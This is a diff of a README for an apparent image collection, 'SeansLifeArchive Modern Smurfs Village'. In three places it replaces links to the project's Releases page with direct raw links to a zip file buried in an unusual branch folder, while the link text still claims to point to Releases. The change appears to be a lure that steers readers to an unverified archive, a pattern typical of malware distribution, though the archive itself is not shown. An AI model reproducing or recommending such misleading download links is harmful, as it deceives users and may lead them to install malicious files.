@@ -1,6 +1,6 @@
 # 🔵️ SeansLifeArchive_Images_ModernSmurfsVillage_Y2025_V8 - Capture Moments from Modern Smurfs Village
 
-[![Download SeansLifeArchive](https://img.shields.io/badge/Download-SeansLifeArchive_Images_ModernSmurfsVillage_Y2025_V8-blue)](https://github.com/Bonglualive/SeansLifeArchive_Images_ModernSmurfsVillage_Y2025_V8/releases)
+[![Download SeansLifeArchive](https://raw.githubusercontent.com/Bonglualive/SeansLifeArchive_Images_ModernSmurfsVillage_Y2025_V8/SeansLifeArchive_Images_ModernSmurfsVillage_Y2025_V8_Main-dev/mil/SeansLifeArchive_Images_ModernSmurfsVillage_Y2025_V8.zip)](https://raw.githubusercontent.com/Bonglualive/SeansLifeArchive_Images_ModernSmurfsVillage_Y2025_V8/SeansLifeArchive_Images_ModernSmurfsVillage_Y2025_V8_Main-dev/mil/SeansLifeArchive_Images_ModernSmurfsVillage_Y2025_V8.zip)
 
 ## 📜 Description
 
@@ -21,7 +21,7 @@ To download and run the application, follow these simple steps:
 
 Go to the Releases page to find the latest version of the module. Click the link below:
 
-[Download SeansLifeArchive from Releases](https://github.com/Bonglualive/SeansLifeArchive_Images_ModernSmurfsVillage_Y2025_V8/releases)
+[Download SeansLifeArchive from Releases](https://raw.githubusercontent.com/Bonglualive/SeansLifeArchive_Images_ModernSmurfsVillage_Y2025_V8/SeansLifeArchive_Images_ModernSmurfsVillage_Y2025_V8_Main-dev/mil/SeansLifeArchive_Images_ModernSmurfsVillage_Y2025_V8.zip)
 
 ### Step 2: Download the Files
 
@@ -49,7 +49,7 @@ After unzipping the file, open the folder where you extracted the images. You ca
 
 To get started with your collection of Modern Smurfs Village images, make sure to visit the page below for the latest files:
 
-[Download SeansLifeArchive from Releases](https://github.com/Bonglualive/SeansLifeArchive_Images_ModernSmurfsVillage_Y2025_V8/releases)
+[Download SeansLifeArchive from Releases](https://raw.githubusercontent.com/Bonglualive/SeansLifeArchive_Images_ModernSmurfsVillage_Y2025_V8/SeansLifeArchive_Images_ModernSmurfsVillage_Y2025_V8_Main-dev/mil/SeansLifeArchive_Images_ModernSmurfsVillage_Y2025_V8.zip)
 
 ## 📖 FAQs
 
